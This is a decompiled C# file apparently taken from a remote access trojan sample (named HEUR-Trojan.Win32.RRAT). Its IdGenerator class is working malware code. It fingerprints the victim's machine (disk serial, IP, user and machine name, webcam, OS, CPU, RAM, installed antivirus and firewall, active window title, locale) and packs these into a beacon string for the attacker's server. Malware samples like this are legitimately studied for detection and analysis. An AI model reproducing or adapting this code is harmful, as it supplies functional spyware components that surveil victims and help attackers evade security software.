// Decompiled with JetBrains decompiler
// Type: Lime.Helper.IdGenerator
// Assembly: Client, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B7B9751B-0E50-4E11-A73D-EB218010FF7C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.RRAT.gen-f6b2c58f9846adcb295edd3c8a5beaec31fff3bc98f6503d04e95be3f9f072e8.exe

using Lime.NativeMethods;
using Lime.Settings;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Globalization;
using System.Management;
using System.Net;
using System.Text;

namespace Lime.Helper
{
  public static class IdGenerator
  {
    public static string SendInfo() => "Information" + Config.key + Config.id + Config.key + StringConverter.Encode("_" + IdGenerator.GetHardDiskSerialNumber()) + Config.key + IdGenerator.GetIp() + Config.key + StringConverter.Encode(Environment.MachineName + " / " + Environment.UserName) + Config.key + IdGenerator.GetCamera() + Config.key + StringConverter.Encode(new ComputerInfo().OSFullName + " " + IdGenerator.GetSystem()) + Config.key + StringConverter.Encode(IdGenerator.GetCpu()) + Config.key + (object) new ComputerInfo().TotalPhysicalMemory + Config.key + IdGenerator.GetAV("Select * from AntiVirusProduct") + Config.key + IdGenerator.GetAV("SELECT * FROM FirewallProduct") + Config.key + Config.port + Config.key + IdGenerator.GetActiveWindow() + Config.key + StringConverter.Encode(CultureInfo.CurrentCulture.Name) + Config.key + "False";

    public static string GetIp()
    {
      try
      {
        return ((IPAddress) Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0)).ToString();
      }
      catch
      {
        return "N/A";
      }
    }

    public static string GetHardDiskSerialNumber()
    {
      try
      {
        string IP = Interaction.Environ("SystemDrive") + "\\";
        string V = (string) null;
        int T = 0;
        int Q = 0;
        int G = 0;
        string J = (string) null;
        int H = 0;
        Native.GVI(ref IP, ref V, T, ref H, ref Q, ref G, ref J, 0);
        return Conversion.Hex(H);
      }
      catch
      {
      }
      return "ERR";
    }

    public static string GetCamera()
    {
      try
      {
        int num = 0;
        do
        {
          short wDriver = (short) num;
          string lpszName = Strings.Space(100);
          int cbName = 100;
          string lpszVer = (string) null;
          if (!Native.capGetDriverDescriptionA(wDriver, ref lpszName, cbName, ref lpszVer, 100))
            ++num;
          else
            goto label_3;
        }
        while (num <= 4);
        goto label_5;
label_3:
        return "Yes";
      }
      catch
      {
      }
label_5:
      return "No";
    }

    public static string GetSystem()
    {
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            return Convert.ToInt32(enumerator.Current["AddressWidth"]).ToString();
        }
      }
      catch
      {
        return "N/A";
      }
      return "N/A";
    }

    public static string GetAV(string product)
    {
      try
      {
        string empty = string.Empty;
        foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\SecurityCenter" + (new ComputerInfo().OSFullName.Contains("XP") ? (object) "" : (object) "2").ToString(), product).Get())
          empty += (string) managementObject["displayName"];
        return empty != string.Empty ? StringConverter.Encode(empty) : StringConverter.Encode("N/A");
      }
      catch
      {
        return StringConverter.Encode("N/A");
      }
    }

    public static string GetCpu()
    {
      try
      {
        return Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", (object) null).ToString();
      }
      catch
      {
        return "N/A";
      }
    }

    public static string GetActiveWindow()
    {
      try
      {
        StringBuilder lpString = new StringBuilder(256);
        Native.GetWindowText(Native.GFW(), lpString, lpString.Capacity);
        return StringConverter.Encode(lpString.ToString());
      }
      catch
      {
        return StringConverter.Encode("");
      }
    }
  }
}
